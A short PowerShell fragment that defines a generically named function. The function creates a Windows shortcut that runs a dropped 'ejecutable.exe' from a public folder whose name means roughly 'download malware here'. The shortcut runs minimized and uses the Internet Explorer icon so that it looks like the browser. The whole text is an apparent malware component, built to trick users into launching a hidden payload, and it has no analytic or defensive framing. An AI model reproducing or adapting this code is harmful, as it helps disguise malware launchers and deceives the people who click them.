function func2
{
	Param([string]$func2String1,[string]$func2String2);
  	try
	{  
    		$wscriptShell = New-Object -ComObject WScript.Shell 
		    $shortcut = $wscriptShell.CreateShortcut($func2String1) 
    		$shortcut.TargetPath = "C:\Users\Public\AquiDescargaMW\Java_rwxzbj9_\ejecutable.exe"       
    		$shortcut.Arguments = "liga.LNS  Java_rwxzbj9_"
    		$shortcut.WorkingDirectory = "C:\Users\Public\AquiDescargaMW\Java_rwxzbj9_\" 
    		$shortcut.WindowStyle = 7   
    		$shortcut.IconLocation = "%ProgramFiles%\Internet Explorer\iexplore.exe,1"
    		$shortcut.Save()
  	}
      finally{}
}